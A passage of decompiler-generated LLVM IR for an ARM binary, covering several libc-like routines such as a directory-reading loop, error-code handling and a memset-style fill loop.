  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_11438 = load i32, i32* @r5, align 4
  %v9_11438 = load i32, i32* @r6, align 4
  %v12_11438 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1144c = call i32 @function_11d34()
  %v2_11454 = icmp eq i32 %v0_1144c, 0
  store i32 126992, i32* @r6, align 4
  br i1 %v2_11454, label %bb, label %dec_label_pc_11464

bb:                                               ; preds = %dec_label_pc_11438
  br label %dec_label_pc_114f0

dec_label_pc_11464:                               ; preds = %dec_label_pc_11438
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11468 = load i32, i32* @r4, align 4
  %v2_11468 = icmp ugt i32 %v0_11468, 511
  %v2_1146c = add i32 %v0_1144c, 4
  %v3_1146c = inttoptr i32 %v2_1146c to i32*
  store i32 0, i32* %v3_1146c, align 4
  %v0_11470 = load i32, i32* %r3.global-to-local, align 4
  %v2_11470 = add i32 %v0_1144c, 16
  %v3_11470 = inttoptr i32 %v2_11470 to i32*
  store i32 %v0_11470, i32* %v3_11470, align 4
  %v0_11474 = load i32, i32* %r3.global-to-local, align 4
  %v2_11474 = add i32 %v0_1144c, 8
  %v3_11474 = inttoptr i32 %v2_11474 to i32*
  store i32 %v0_11474, i32* %v3_11474, align 4
  br i1 %v2_11468, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_11464
  %v0_1147c2 = load i32, i32* @r4, align 4
  %v2_1147c3 = add i32 %v0_1144c, 20
  %v3_1147c4 = inttoptr i32 %v2_1147c3 to i32*
  store i32 %v0_1147c2, i32* %v3_1147c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_11464
  %v1_11478 = load i32, i32* %r3.global-to-local, align 4
  %v2_11478 = add i32 %v1_11478, 512
  store i32 %v2_11478, i32* %r3.global-to-local, align 4
  %v0_1147c = load i32, i32* @r4, align 4
  %v2_1147c = add i32 %v0_1144c, 20
  %v3_1147c = inttoptr i32 %v2_1147c to i32*
  store i32 %v0_1147c, i32* %v3_1147c, align 4
  %v1_11480 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11480, i32* %v3_1147c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1144c, i32* @r5, align 4
  %v0_11488 = load i32, i32* @r7, align 4
  %v2_11488 = inttoptr i32 %v0_1144c to i32*
  store i32 %v0_11488, i32* %v2_11488, align 4
  %v0_1148c = load i32, i32* @r5, align 4
  %v1_1148c = add i32 %v0_1148c, 20
  %v2_1148c = inttoptr i32 %v1_1148c to i32*
  %v3_1148c = load i32, i32* %v2_1148c, align 4
  store i32 %v3_1148c, i32* %r1.global-to-local, align 4
  %v2_11494 = call i32 @function_12654(i32 1, i32 %v3_1148c)
  %v2_11498 = icmp eq i32 %v2_11494, 0
  store i32 %v2_11494, i32* @r4, align 4
  %v1_114a0 = load i32, i32* @r5, align 4
  %v2_114a0 = add i32 %v1_114a0, 12
  %v3_114a0 = inttoptr i32 %v2_114a0 to i32*
  store i32 %v2_11494, i32* %v3_114a0, align 4
  br i1 %v2_11498, label %dec_label_pc_114a8, label %dec_label_pc_114b8

dec_label_pc_114a8:                               ; preds = %bb17
  %v0_114a8 = load i32, i32* @r5, align 4
  store i32 %v0_114a8, i32* @r0, align 4
  %v0_114ac = call i32 @function_12da0()
  %v0_114b0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_114f0

dec_label_pc_114b8:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_114e0 = load i32, i32* @r5, align 4
  %v1_114e0 = add i32 %v0_114e0, 24
  %v1_114e4 = inttoptr i32 %v1_114e0 to i32*
  store i32 0, i32* %v1_114e4, align 4
  %v3_114e4 = add i32 %v0_114e0, 28
  %v4_114e4 = inttoptr i32 %v3_114e4 to i32*
  %v5_114e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_114e4, i32* %v4_114e4, align 4
  %v6_114e4 = add i32 %v0_114e0, 32
  %v7_114e4 = inttoptr i32 %v6_114e4 to i32*
  %v8_114e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_114e4, i32* %v7_114e4, align 4
  %v9_114e4 = add i32 %v0_114e0, 36
  %v10_114e4 = inttoptr i32 %v9_114e4 to i32*
  %v11_114e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_114e4, i32* %v10_114e4, align 4
  %v12_114e4 = add i32 %v0_114e0, 40
  %v2_114e8 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_114ec = inttoptr i32 %v12_114e4 to i32*
  store i32 %v2_114e8, i32* %v1_114ec, align 4
  %v3_114ec = add i32 %v0_114e0, 44
  %v4_114ec = inttoptr i32 %v3_114ec to i32*
  %v5_114ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_114ec, i32* %v4_114ec, align 4
  %v0_114f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %bb, %dec_label_pc_114a8, %dec_label_pc_114b8
  %v0_114f0 = phi i32 [ 0, %bb ], [ %v0_114b0, %dec_label_pc_114a8 ], [ %v0_114f0.pre, %dec_label_pc_114b8 ]
  store i32 %v6_11438, i32* @r5, align 4
  store i32 %v9_11438, i32* @r6, align 4
  store i32 %v12_11438, i32* @r7, align 4
  ret i32 %v0_114f0

; uselistorder directives
  uselistorder i32 %v2_11494, { 1, 0, 2 }
  uselistorder i32 %v0_1144c, { 5, 4, 3, 0, 1, 2, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_114f0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_11508(i32 %arg1) local_unnamed_addr {
dec_label_pc_11508:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_11508 = load i32, i32* @r7, align 4
  %v2_11510 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_11538, label %dec_label_pc_11528

dec_label_pc_11528:                               ; preds = %dec_label_pc_11508
  %v0_11528 = call i32 @function_11734()
  %v0_1152c = load i32, i32* @r7, align 4
  %v1_1152c = sub i32 0, %v0_1152c
  %v2_11530 = inttoptr i32 %v0_11528 to i32*
  store i32 %v1_1152c, i32* %v2_11530, align 4
  br label %dec_label_pc_1155c

dec_label_pc_11538:                               ; preds = %dec_label_pc_11508
  %v1_11538 = icmp slt i32 %arg1, 0
  br i1 %v1_11538, label %dec_label_pc_1155c, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11538
  store i32 %v2_11510, i32* @r1, align 4
  %v0_11544 = call i32 @function_14250()
  %v1_11548 = icmp slt i32 %v0_11544, 0
  br i1 %v1_11548, label %dec_label_pc_11550, label %dec_label_pc_11564

dec_label_pc_11550:                               ; preds = %dec_label_pc_11540
  br label %dec_label_pc_1155c

dec_label_pc_1155c:                               ; preds = %dec_label_pc_11550, %dec_label_pc_11538, %dec_label_pc_11528
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_115a0

dec_label_pc_11564:                               ; preds = %dec_label_pc_11540
  %v0_1156c = load i32, i32* @r7, align 4
  %v3_11570 = call i32 @function_111ac(i32 %v0_1156c, i32 2, i32 1)
  %v0_11574 = load i32, i32* @r7, align 4
  %v2_1157c = call i32 @function_11438(i32 %v0_11574, i32 %tmp)
  store i32 %v2_1157c, i32* %r4.global-to-local, align 4
  %v2_11580 = icmp eq i32 %v2_1157c, 0
  br i1 %v2_11580, label %dec_label_pc_11588, label %dec_label_pc_115a0

dec_label_pc_11588:                               ; preds = %dec_label_pc_11564
  %v0_11594 = call i32 @function_11734()
  %v2_1159c = inttoptr i32 %v0_11594 to i32*
  store i32 12, i32* %v2_1159c, align 4
  %v0_115a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11564, %dec_label_pc_1155c, %dec_label_pc_11588
  %v0_115a0 = phi i32 [ %v2_1157c, %dec_label_pc_11564 ], [ 0, %dec_label_pc_1155c ], [ %v0_115a0.pre, %dec_label_pc_11588 ]
  store i32 %v6_11508, i32* @r7, align 4
  ret i32 %v0_115a0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_115a0, { 2, 0, 1 }
}

define i32 @function_115b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_115b0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_115b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115b0, label %bb, label %dec_label_pc_115b0._crit_edge

dec_label_pc_115b0._crit_edge:                    ; preds = %dec_label_pc_115b0
  br label %bb11

bb:                                               ; preds = %dec_label_pc_115b0
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_115b0._crit_edge, %bb
  %v2_115b8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_115b8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_115c4 = call i32 @function_14250()
  store i32 %v0_115c4, i32* @r5, align 4
  %v2_115c8 = icmp eq i32 %v0_115c4, 0
  br i1 %v2_115c8, label %dec_label_pc_115d0, label %dec_label_pc_11638

dec_label_pc_115d0:                               ; preds = %bb11
  %v1_115d4 = and i32 %tmp5, 61440
  store i32 %v1_115d4, i32* @r3, align 4
  %v7_115d8 = icmp eq i32 %v1_115d4, 16384
  br i1 %v7_115d8, label %dec_label_pc_115f0, label %dec_label_pc_115e0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_115d0
  %v0_115e0 = call i32 @function_11734()
  br label %dec_label_pc_1161c

dec_label_pc_115f0:                               ; preds = %dec_label_pc_115d0
  %v0_115f0 = load i32, i32* @r4, align 4
  %v2_115f8 = call i32 @function_11140(i32 %v0_115f0, i32 3)
  %v7_115fc = icmp eq i32 %v2_115f8, -1
  br i1 %v7_115fc, label %dec_label_pc_11638, label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_115f0
  %v1_11604 = urem i32 %v2_115f8, 4
  %v7_11608 = icmp eq i32 %v1_11604, 1
  br i1 %v7_11608, label %dec_label_pc_11610, label %dec_label_pc_11624

dec_label_pc_11610:                               ; preds = %dec_label_pc_11604
  %v0_11610 = call i32 @function_11734()
  br label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_115e0, %dec_label_pc_11610
  %storemerge2 = phi i32 [ %v0_115e0, %dec_label_pc_115e0 ], [ %v0_11610, %dec_label_pc_11610 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_115e0 ], [ 22, %dec_label_pc_11610 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_1161c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1161c, align 4
  %v0_1163c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1163c

dec_label_pc_11624:                               ; preds = %dec_label_pc_11604
  %v0_11624 = load i32, i32* @r4, align 4
  %v2_1162c = call i32 @function_11438(i32 %v0_11624, i32 %tmp)
  store i32 %v2_1162c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1163c

dec_label_pc_11638:                               ; preds = %bb11, %dec_label_pc_115f0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1163c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_11624, %dec_label_pc_1161c, %dec_label_pc_11638
  %v0_1163c = phi i32 [ %v2_1162c, %dec_label_pc_11624 ], [ %v0_1163c.pre, %dec_label_pc_1161c ], [ 0, %dec_label_pc_11638 ]
  ret i32 %v0_1163c

; uselistorder directives
  uselistorder i32 %v2_115f8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_11438, { 1, 0 }
  uselistorder i32 ()* @function_14250, { 1, 0 }
  uselistorder label %dec_label_pc_1163c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11638, { 1, 0 }
  uselistorder label %dec_label_pc_1161c, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_1164c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1164c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1164c = load i32, i32* @r4, align 4
  %v6_1164c = load i32, i32* @r5, align 4
  %v9_1164c = load i32, i32* @r6, align 4
  %v12_1164c = load i32, i32* @r7, align 4
  %v15_1164c = load i32, i32* @lr, align 4
  store i32 126992, i32* @r6, align 4
  %v1_11660 = add i32 %tmp, 24
  store i32 %v1_11660, i32* @r4, align 4
  %v4_11664 = load i32, i32* inttoptr (i32 127028 to i32*), align 4
  store i32 %v4_11664, i32* %r1.global-to-local, align 4
  store i32 %v1_11660, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11678 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_11678)
  %v0_1168c = load i32, i32* @r6, align 4
  %v2_1168c = add i32 %v0_1168c, 16
  %v3_1168c = inttoptr i32 %v2_1168c to i32*
  %v4_1168c = load i32, i32* %v3_1168c, align 4
  store i32 %v4_1168c, i32* @ip, align 4
  store i32 71320, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1168c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %dec_label_pc_116cc, %dec_label_pc_1164c
  %v0_1169c = load i32, i32* @r5, align 4
  %v1_1169c = add i32 %v0_1169c, 4
  %v2_1169c = inttoptr i32 %v1_1169c to i32*
  %v3_1169c = load i32, i32* %v2_1169c, align 4
  store i32 %v3_1169c, i32* %r2.global-to-local, align 4
  %v4_1169c = add i32 %v0_1169c, 8
  %v5_1169c = inttoptr i32 %v4_1169c to i32*
  %v6_1169c = load i32, i32* %v5_1169c, align 4
  %tmp10 = icmp ugt i32 %v6_1169c, %v3_1169c
  br i1 %tmp10, label %dec_label_pc_116cc, label %dec_label_pc_116a8

dec_label_pc_116a8:                               ; preds = %dec_label_pc_1169c
  %v1_116a8 = inttoptr i32 %v0_1169c to i32*
  %v2_116a8 = load i32, i32* %v1_116a8, align 4
  %v1_116ac = add i32 %v0_1169c, 12
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r1.global-to-local, align 4
  %v1_116b0 = add i32 %v0_1169c, 20
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  store i32 %v3_116b0, i32* %r2.global-to-local, align 4
  %v4_116b4 = call i32 @function_141bc(i32 %v2_116a8, i32 %v3_116ac, i32 %v3_116b0, i32 %v6_1169c)
  %tmp9 = icmp slt i32 %v4_116b4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_116c4

.thread:                                          ; preds = %dec_label_pc_116a8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_116f8

dec_label_pc_116c4:                               ; preds = %dec_label_pc_116a8
  %v1_116c4 = load i32, i32* @r5, align 4
  %v2_116c4 = add i32 %v1_116c4, 8
  %v3_116c4 = inttoptr i32 %v2_116c4 to i32*
  store i32 %v4_116b4, i32* %v3_116c4, align 4
  %v0_116c8 = load i32, i32* @r7, align 4
  %v1_116c8 = load i32, i32* @r5, align 4
  %v2_116c8 = add i32 %v1_116c8, 4
  %v3_116c8 = inttoptr i32 %v2_116c8 to i32*
  store i32 %v0_116c8, i32* %v3_116c8, align 4
  %v0_116cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_116cc

dec_label_pc_116cc:                               ; preds = %dec_label_pc_1169c, %dec_label_pc_116c4
  %v1_116dc = phi i32 [ %v0_1169c, %dec_label_pc_1169c ], [ %v0_116cc.pre, %dec_label_pc_116c4 ]
  %v1_116cc = add i32 %v1_116dc, 4
  %v2_116cc = inttoptr i32 %v1_116cc to i32*
  %v3_116cc = load i32, i32* %v2_116cc, align 4
  store i32 %v3_116cc, i32* %r2.global-to-local, align 4
  %v1_116d0 = add i32 %v1_116dc, 12
  %v2_116d0 = inttoptr i32 %v1_116d0 to i32*
  %v3_116d0 = load i32, i32* %v2_116d0, align 4
  store i32 %v3_116d0, i32* %r1.global-to-local, align 4
  %v2_116d4 = add i32 %v3_116d0, %v3_116cc
  store i32 %v2_116d4, i32* @r4, align 4
  %v1_116d8 = add i32 %v2_116d4, 4
  %v2_116d8 = inttoptr i32 %v1_116d8 to i32*
  %v3_116d8 = load i32, i32* %v2_116d8, align 4
  %v2_116dc = add i32 %v1_116dc, 16
  %v3_116dc = inttoptr i32 %v2_116dc to i32*
  store i32 %v3_116d8, i32* %v3_116dc, align 4
  %v0_116e0 = load i32, i32* @r4, align 4
  %v1_116e0 = add i32 %v0_116e0, 8
  %v2_116e0 = inttoptr i32 %v1_116e0 to i16*
  %v3_116e0 = load i16, i16* %v2_116e0, align 2
  %v4_116e0 = zext i16 %v3_116e0 to i32
  %v0_116e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_116e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_116e4 = add i32 %v1_116e4, %v0_116e4
  %v3_116e4 = inttoptr i32 %v2_116e4 to i32*
  %v4_116e4 = load i32, i32* %v3_116e4, align 4
  store i32 %v4_116e4, i32* %r1.global-to-local, align 4
  %v2_116e8 = add i32 %v0_116e4, %v4_116e0
  %v2_116ec = icmp eq i32 %v4_116e4, 0
  %v1_116f0 = load i32, i32* @r5, align 4
  %v2_116f0 = add i32 %v1_116f0, 4
  %v3_116f0 = inttoptr i32 %v2_116f0 to i32*
  store i32 %v2_116e8, i32* %v3_116f0, align 4
  br i1 %v2_116ec, label %dec_label_pc_1169c, label %dec_label_pc_116f8

dec_label_pc_116f8:                               ; preds = %dec_label_pc_116cc, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11704 = load i32, i32* @r6, align 4
  %v2_11704 = add i32 %v0_11704, 24
  %v3_11704 = inttoptr i32 %v2_11704 to i32*
  %v4_11704 = load i32, i32* %v3_11704, align 4
  call void @__pseudo_branch(i32 %v4_11704)
  %v0_11710 = load i32, i32* @r4, align 4
  store i32 %v3_1164c, i32* @r4, align 4
  store i32 %v6_1164c, i32* @r5, align 4
  store i32 %v9_1164c, i32* @r6, align 4
  store i32 %v12_1164c, i32* @r7, align 4
  store i32 %v15_1164c, i32* @lr, align 4
  ret i32 %v0_11710

; uselistorder directives
  uselistorder i32 %v1_116dc, { 0, 2, 1 }
  uselistorder i32 %v6_1169c, { 1, 0 }
  uselistorder i32 %v0_1169c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_116cc, { 1, 0 }
}

define i32 @function_11724(i32 %arg1) local_unnamed_addr {
dec_label_pc_11724:
  %v0_11724 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11724, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11724
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11724, %bb
  %v10_11730 = phi i32 [ %arg1, %dec_label_pc_11724 ], [ 0, %bb ]
  ret i32 %v10_11730

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11734() local_unnamed_addr {
dec_label_pc_11734:
  store i32 126992, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_1f2c4.347 to i32)
}

define i32 @function_11750(i32 %arg1) local_unnamed_addr {
dec_label_pc_11750:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11754 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11754, i32* @r0, align 4
  %v1_1175c = call i32 @function_1462c(i32 %v2_11754)
  %v2_11760 = load i32, i32* %stack_var_-24, align 4
  %v2_11764 = add i32 %v2_11760, %tmp
  %v2_1176c = mul i32 %v2_11764, 10000
  %v1_11770 = and i32 %v2_1176c, 2147483632
  ret i32 %v1_11770

; uselistorder directives
  uselistorder i32 %v2_11754, { 1, 0 }
}

define i32 @function_11790(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11790:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11794 = load i32, i32* @r2, align 4
  %v8_11794 = icmp eq i32 %v0_11794, 8
  store i1 %v8_11794, i1* %cpsr_z.global-to-local, align 1
  %v5_11798 = icmp slt i32 %v0_11794, 8
  br i1 %v5_11798, label %dec_label_pc_117f8, label %dec_label_pc_1179c

dec_label_pc_1179c:                               ; preds = %dec_label_pc_11790
  %v4_1179c = mul i32 %arg2, 256
  %v5_1179c = or i32 %v4_1179c, %arg2
  %v4_117a0 = mul i32 %v5_1179c, 65536
  %v5_117a0 = or i32 %v4_117a0, %v5_1179c
  store i32 %v5_117a0, i32* %r1.global-to-local, align 4
  %v1_117a457 = urem i32 %tmp, 4
  %v2_117a458 = icmp eq i32 %v1_117a457, 0
  store i1 %v2_117a458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_117a458, label %dec_label_pc_117b4, label %bb

bb:                                               ; preds = %dec_label_pc_1179c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1179c ]
  %v3_117a859 = phi i32 [ %v6_117a8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1179c ]
  %v4_117a8 = inttoptr i32 %v3_117a859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_117a8, align 1
  %v5_117a8 = load i32, i32* @r3, align 4
  %v6_117a8 = add i32 %v5_117a8, 1
  store i32 %v6_117a8, i32* @r3, align 4
  %v0_117ac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_117b8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_117ac.pr, label %dec_label_pc_117b4, label %.thread

.thread:                                          ; preds = %bb
  %v2_117ac = add i32 %v0_117b8.pr.pre, -1
  store i32 %v2_117ac, i32* @r2, align 4
  %v1_117a4 = urem i32 %v6_117a8, 4
  %v2_117a4 = icmp eq i32 %v1_117a4, 0
  store i1 %v2_117a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117a4, label %dec_label_pc_117b4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_117a8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_117a8.pre to i8
  br label %bb

dec_label_pc_117b4:                               ; preds = %.thread, %bb, %dec_label_pc_1179c
  %v0_117c028 = phi i32 [ %tmp, %dec_label_pc_1179c ], [ %v6_117a8, %bb ], [ %v6_117a8, %.thread ]
  %v0_117b8.pr = phi i32 [ %v0_11794, %dec_label_pc_1179c ], [ %v0_117b8.pr.pre, %bb ], [ %v2_117ac, %.thread ]
  %v0_117b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_117b4, i32* @ip, align 4
  %v8_117b810 = icmp eq i32 %v0_117b8.pr, 8
  store i1 %v8_117b810, i1* %cpsr_z.global-to-local, align 1
  %v5_117bc11 = icmp slt i32 %v0_117b8.pr, 8
  br i1 %v5_117bc11, label %dec_label_pc_117f8, label %dec_label_pc_117c0.preheader

dec_label_pc_117c0.preheader:                     ; preds = %dec_label_pc_117b4
  %v1_117c046 = inttoptr i32 %v0_117c028 to i32*
  store i32 %v0_117b4, i32* %v1_117c046, align 4
  %v3_117c047 = add i32 %v0_117c028, 4
  %v4_117c048 = inttoptr i32 %v3_117c047 to i32*
  %v5_117c049 = load i32, i32* @ip, align 4
  store i32 %v5_117c049, i32* %v4_117c048, align 4
  %v6_117c050 = add i32 %v0_117c028, 8
  store i32 %v6_117c050, i32* @r3, align 4
  %v0_117c451 = load i32, i32* @r2, align 4
  %v1_117c452 = add i32 %v0_117c451, -8
  store i32 %v1_117c452, i32* %r2.global-to-local, align 4
  %v5_117cc53 = icmp slt i32 %v1_117c452, 8
  br i1 %v5_117cc53, label %dec_label_pc_117c0.dec_label_pc_117f8.loopexit_crit_edge, label %dec_label_pc_117d0

dec_label_pc_117d0:                               ; preds = %dec_label_pc_117c0.preheader, %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge
  %v6_117c055 = phi i32 [ %v6_117c0, %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge ], [ %v6_117c050, %dec_label_pc_117c0.preheader ]
  %v0_117c054 = phi i32 [ %v12_117ec, %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge ], [ %v0_117c028, %dec_label_pc_117c0.preheader ]
  %v1_117d0 = inttoptr i32 %v6_117c055 to i32*
  %v2_117d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_117d0, i32* %v1_117d0, align 4
  %v3_117d0 = add i32 %v0_117c054, 12
  %v4_117d0 = inttoptr i32 %v3_117d0 to i32*
  %v5_117d0 = load i32, i32* @ip, align 4
  store i32 %v5_117d0, i32* %v4_117d0, align 4
  %v6_117d0 = add i32 %v0_117c054, 16
  store i32 %v6_117d0, i32* @r3, align 4
  %v0_117d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117d4 = add i32 %v0_117d4, -8
  store i32 %v1_117d4, i32* %r2.global-to-local, align 4
  %v5_117dc = icmp slt i32 %v1_117d4, 8
  br i1 %v5_117dc, label %dec_label_pc_117d0.dec_label_pc_117f8.loopexit_crit_edge, label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117d0
  %v1_117e0 = inttoptr i32 %v6_117d0 to i32*
  %v2_117e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_117e0, i32* %v1_117e0, align 4
  %v3_117e0 = add i32 %v0_117c054, 20
  %v4_117e0 = inttoptr i32 %v3_117e0 to i32*
  %v5_117e0 = load i32, i32* @ip, align 4
  store i32 %v5_117e0, i32* %v4_117e0, align 4
  %v6_117e0 = add i32 %v0_117c054, 24
  store i32 %v6_117e0, i32* @r3, align 4
  %v0_117e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117e4 = add i32 %v0_117e4, -8
  store i32 %v1_117e4, i32* %r2.global-to-local, align 4
  %v5_117ec = icmp slt i32 %v1_117e4, 8
  br i1 %v5_117ec, label %dec_label_pc_117e0.dec_label_pc_117f8.loopexit_crit_edge, label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_117e0
  %v7_117ec = inttoptr i32 %v6_117e0 to i32*
  %v8_117ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_117ec, i32* %v7_117ec, align 4
  %v9_117ec = add i32 %v0_117c054, 28
  %v10_117ec = inttoptr i32 %v9_117ec to i32*
  %v11_117ec = load i32, i32* @ip, align 4
  store i32 %v11_117ec, i32* %v10_117ec, align 4
  %v12_117ec = add i32 %v0_117c054, 32
  store i32 %v12_117ec, i32* @r3, align 4
  %v6_117f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_117f0 = add i32 %v6_117f0, -8
  store i32 %v7_117f0, i32* %r2.global-to-local, align 4
  %v5_117bc = icmp slt i32 %v7_117f0, 8
  br i1 %v5_117bc, label %dec_label_pc_117b8.dec_label_pc_117f8.loopexit_crit_edge, label %dec_label_pc_117b8.dec_label_pc_117c0_crit_edge

dec_label_pc_117b8.dec_label_pc_117c0_crit_edge:  ; preds = %dec_label_pc_117b8
  %v2_117c0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_117c0 = inttoptr i32 %v12_117ec to i32*
  store i32 %v2_117c0.pre, i32* %v1_117c0, align 4
  %v3_117c0 = add i32 %v0_117c054, 36
  %v4_117c0 = inttoptr i32 %v3_117c0 to i32*
  %v5_117c0 = load i32, i32* @ip, align 4
  store i32 %v5_117c0, i32* %v4_117c0, align 4
  %v6_117c0 = add i32 %v0_117c054, 40
  store i32 %v6_117c0, i32* @r3, align 4
  %v0_117c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117c4 = add i32 %v0_117c4, -8
  store i32 %v1_117c4, i32* %r2.global-to-local, align 4
  %v5_117cc = icmp slt i32 %v1_117c4, 8
  br i1 %v5_117cc, label %dec_label_pc_117c0.dec_label_pc_117f8.loopexit_crit_edge, label %dec_label_pc_117d0

dec_label_pc_117b8.dec_label_pc_117f8.loopexit_crit_edge: ; preds = %dec_label_pc_117b8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117f8

